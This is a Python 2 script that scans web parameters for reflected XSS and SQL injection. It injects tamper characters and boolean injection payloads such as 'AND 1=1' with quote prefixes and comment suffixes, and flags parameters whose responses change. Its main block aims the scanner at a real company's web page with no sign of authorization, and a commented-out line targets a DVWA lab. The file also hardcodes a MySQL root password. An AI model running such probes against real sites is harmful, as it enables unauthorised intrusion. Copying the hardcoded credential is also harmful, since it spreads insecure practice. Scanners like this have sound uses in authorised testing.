#!-*-coding:UTF-8-*-
import  optparse, random, re, string, urllib, urllib2,difflib,itertools,httplib

from hole_data.mysql import Mysql

NAME    = "Scanner for RXSS and SQLI"
AUTHOR  = "xxx"
PREFIXES = (" ", ") ", "' ", "') ", "\"")
SUFFIXES = ("", "-- -", "#")
BOOLEAN_TESTS = ("AND %d=%d", "OR NOT (%d=%d)")
TAMPER_SQL_CHAR_POOL = ('(', ')', '\'', '"''"')
TAMPER_XSS_CHAR_POOL = ('\'', '"', '>', '<', ';')
GET, POST = "GET", "POST"
COOKIE, UA, REFERER  = "Cookie", "User-Agent", "Referer"
TEXT, HTTPCODE, TITLE, HTML = xrange(4)
_headers = {}

USER_AGENTS = (
    "Mozilla/5.0 (X11; Linux i686; rv:38.0) Gecko/20100101 Firefox/38.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7_0; en-US) AppleWebKit/534.21 (KHTML, like Gecko) Chrome/11.0.678.0 Safari/534.21",
)

host, user, passwd, database = "127.0.0.1", "root", "jlu52111812", "test1"
mysql = Mysql(host, user, passwd, database)

# 从数据库中加载xss漏洞信息
XSS_PATTERNS = []
select_sql = "select feature from holedb where type=\"xss\""
results = mysql.select_sql(select_sql)
for row in results:
    XSS_PATTERNS.append(row[0])



# 从数据库中加载sql漏洞信息
DBMS_ERRORS = {}
select_sql = "select info,feature from holedb where type=\"sql\""
results = mysql.select_sql(select_sql)
for row in results:
    key, value = row[0], row[1]
    if not DBMS_ERRORS.has_key(key):
        DBMS_ERRORS[key] = []
    DBMS_ERRORS[key].append(value)

# 从url取回内容来判断xss漏洞
def _retrieve_content_xss(url, data=None):
    surl=""
    for i in xrange(len(url)):
        if i > url.find('?'):
            surl+=surl.join(url[i]).replace(' ',"%20")
        else:
            surl+=surl.join(url[i])
    try:
        req = urllib2.Request(surl, data, _headers)
        retval = urllib2.urlopen(req, timeout=30).read()
    except Exception, ex:
        retval = getattr(ex, "message", "")
    return retval or ""

# 从url取回内容来判断sql漏洞
def _retrieve_content_sql(url, data=None):
    retval = {HTTPCODE: httplib.OK}
    surl=""
    for i in xrange(len(url)):
        if i > url.find('?'):
            surl+=surl.join(url[i]).replace(' ',"%20")
        else:
            surl+=surl.join(url[i])
    try:
        req = urllib2.Request(surl, data, _headers)
        retval[HTML] = urllib2.urlopen(req, timeout=30).read()
    except Exception, ex:
        retval[HTTPCODE] = getattr(ex, "code", None)
        retval[HTML] = getattr(ex, "message", "")
    match = re.search(r"<title>(?P<result>[^<]+)</title>", retval[HTML], re.I)
    retval[TITLE] = match.group("result") if match else None
    retval[TEXT] = re.sub(r"(?si)<script.+?</script>|<!--.+?-->|<style.+?</style>|<[^>]+>|\s+", " ", retval[HTML])
    return retval

def scan_page_xss(url, data=None, result=[]):
    result.append("Start scanning RXSS:\n")
    print "Start scanning RXSS:\n"
    retval, usable = False, False
    url = re.sub(r"=(&|\Z)", "=1\g<1>", url) if url else url
    data=re.sub(r"=(&|\Z)", "=1\g<1>", data) if data else data
    try:
        for phase in (GET, POST):
            current = url if phase is GET else (data or "")
            for match in re.finditer(r"((\A|[?&])(?P<parameter>[\w]+)=)(?P<value>[^&]+)", current):
                found, usable = False, True
                s1 = "Scanning %s parameter '%s'" % (phase, match.group("parameter"))
                result.append(s1)
                print s1
                prefix = ("".join(random.sample(string.ascii_lowercase, 5)))
                suffix = ("".join(random.sample(string.ascii_lowercase, 5)))
                if not found:
                    tampered = current.replace(match.group(0), "%s%s" % (match.group(0), urllib.quote("%s%s%s%s" % ("'", prefix, "".join(random.sample(TAMPER_XSS_CHAR_POOL, len(TAMPER_XSS_CHAR_POOL))), suffix))))
                    content = _retrieve_content_xss(tampered, data) if phase is GET else _retrieve_content_xss(url, tampered)
                    for sample in re.finditer("%s([^ ]+?)%s" % (prefix, suffix), content, re.I):
                        #print sample.group()
                        #for regex, info, content_removal_regex in XSS_PATTERNS:
                        for xss_pattern in XSS_PATTERNS:
                            list = xss_pattern.split(",")
                            if len(list)>2:
                                regex, info, content_removal_regex = list[0], list[1], list[2]
                            else:
                                regex, info, content_removal_regex = list[0], list[1], None
                            context = re.search(regex % {"chars": re.escape(sample.group(0))}, re.sub(content_removal_regex or "", "", content), re.I)
                            if context and not found and sample.group(1).strip():
                                s2 = "!!!%s parameter '%s' appears to be XSS vulnerable (%s)" % (phase, match.group("parameter"), info)
                                result.append(s2)
                                print s2
                                found = retval = True
            if not usable:
                s3 = " (x) no usable GET/POST parameters found"
                result.append(s3)
                print s3
    except KeyboardInterrupt as e:
        print e
        print "\r (x) Ctrl-C pressed"
    return retval

def scan_page_sql(url, data=None, result=[]):
    result.append("Start scanning SQLI:\n")
    print "Start scanning SQLI:\n"
    retval, usable = False, False
    url = re.sub(r"=(&|\Z)", "=1\g<1>", url) if url else url
    data=re.sub(r"=(&|\Z)", "=1\g<1>", data) if data else data
    try:
        for phase in (GET, POST):
            current = url if phase is GET else (data or "")
            for match in re.finditer(r"((\A|[?&])(?P<parameter>\w+)=)(?P<value>[^&]+)", current):
                vulnerable, usable = False, True
                original=None
                s1 = "Scanning %s parameter '%s'" % (phase, match.group("parameter"))
                result.append(s1)
                print s1
                tampered = current.replace(match.group(0), "%s%s" % (match.group(0), urllib.quote("".join(random.sample(TAMPER_SQL_CHAR_POOL, len(TAMPER_SQL_CHAR_POOL))))))
                content = _retrieve_content_sql(tampered, data) if phase is GET else _retrieve_content_sql(url, tampered)
            for (dbms, regex) in ((dbms, regex) for dbms in DBMS_ERRORS for regex in DBMS_ERRORS[dbms]):
                if not vulnerable and re.search(regex, content[HTML], re.I):
                    s2 = "!!!%s parameter '%s' could be error SQLi vulnerable (%s)" % (phase, match.group("parameter"), dbms)
                    result.append(s2)
                    print s2
                    retval = vulnerable = True
            vulnerable = False
            original = original or (_retrieve_content_sql(current, data) if phase is GET else _retrieve_content_sql(url, current))
            for prefix,boolean,suffix in itertools.product(PREFIXES,BOOLEAN_TESTS,SUFFIXES):
                if not vulnerable:
                    template = "%s%s%s" % (prefix,boolean, suffix)
                    payloads = dict((_, current.replace(match.group(0), "%s%s" % (match.group(0), urllib.quote(template % (1 if _ else 2, 1), safe='%')))) for _ in (True, False))
                    contents = dict((_, _retrieve_content_sql(payloads[_], data) if phase is GET else _retrieve_content_sql(url, payloads[_])) for _ in (False, True))
                    if all(_[HTTPCODE] for _ in (original, contents[True], contents[False])) and (any(original[_] == contents[True][_] != contents[False][_] for _ in (HTTPCODE, TITLE))):
                        vulnerable = True
                    else:
                        ratios = dict((_, difflib.SequenceMatcher(None, original[TEXT], contents[_][TEXT]).quick_ratio()) for _ in (True, False))
                        vulnerable = all(ratios.values()) and ratios[True] > 0.95 and ratios[False] < 0.95
                    if vulnerable:
                        s3 = "!!!%s parameter '%s' could be error Blind SQLi vulnerable" % (phase, match.group("parameter"))
                        result.append(s3)
                        print s3
                        retval = True
            if not usable:
                s4 = " (x) no usable GET/POST parameters found"
                result.append(s4)
                print s4
    except KeyboardInterrupt:
        print "\r (x) Ctrl-C pressed"
    return retval

def init_options(proxy=None, cookie=None, ua=None, referer=None):
    global _headers
    _headers = dict(filter(lambda _: _[1], ((COOKIE, cookie), (UA, ua or NAME), (REFERER, referer))))
    urllib2.install_opener(urllib2.build_opener(urllib2.ProxyHandler({'http': proxy})) if proxy else None)


def scan_xss_sql(url, cookie=None):
    result_list = []
    init_options(None, cookie, None, None)
    if url:
        result_xss= scan_page_xss(url if url.startswith("http") else "http://%s" % url, None, result_list)
        result_str_xss = "\nScan results: %s vulnerabilities found" % ("possible" if result_xss else "no")
        result_list.append(result_str_xss)
        print result_str_xss
        split_str =  "----------------------------------------------------------------------------------"
        result_list.append(split_str)
        result_sql = scan_page_sql(url if url.startswith("http") else "http://%s" % url, None,result_list)
        result_str_sql = "\nScan results: %s vulnerabilities found" % ("possible" if result_sql else "no")
        result_list.append(result_str_sql)
        print result_str_sql
        split_str2 = "----------------------------------------------------------------------------------"
        result_list.append(split_str2)
    else:
        print "请输入url"
    return result_list

if __name__ == "__main__":

    url = "http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4"
    scan_xss_sql(url)

    # url = "http://10.2.58.190/DVMA-master/vulnerabilities/xss_r/index.php?name=&user_token="
    # cookie = "security=low;PHPSESSID=jv7t1qc9r0dja22kue61151sp0"
    # scan_xss_sql(url, cookie)